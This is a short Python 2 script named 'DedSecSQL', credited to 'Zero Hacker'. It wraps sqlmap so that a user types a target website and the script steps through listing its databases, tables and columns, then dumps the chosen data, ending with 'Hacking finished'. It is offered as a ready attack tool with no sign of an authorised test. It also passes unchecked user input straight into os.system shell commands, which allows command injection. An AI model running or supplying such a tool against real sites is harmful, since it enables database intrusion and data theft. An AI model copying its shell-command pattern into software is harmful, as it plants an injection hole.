import sys, os, time
from time import sleep as timeout
#Banner
os.system("clear")
os.system("figlet DedSecSQL")
print "Python Programing by Zero Hacker"
print "YouTube : https://www.youtube.com/channel/UC0m4EAZ9_PMfygFXx9P25hg"
print "Blog    : https://dedseccyberteam.blogspot.com/?m=1"
print
#Hacking
web = raw_input("Terget WebSite : ")
os.system("sqlmap -u %s --dbs"%(web))
data = raw_input("DataBase : ")
os.system("sqlmap -u %s -D %s --tables"%(web, data))
tables = raw_input("Tables : ")
os.system("sqlmap -u %s -D %s -T %s --columns"%(web, data,tables))
columns = raw_input("columns : ")
os.system("sqlmap -u %s -D %s -T %s -C %s --dump"%(web, data, tables, columns))
print "Hacking finished"
timeout(3)
print "Thank you for using"
print
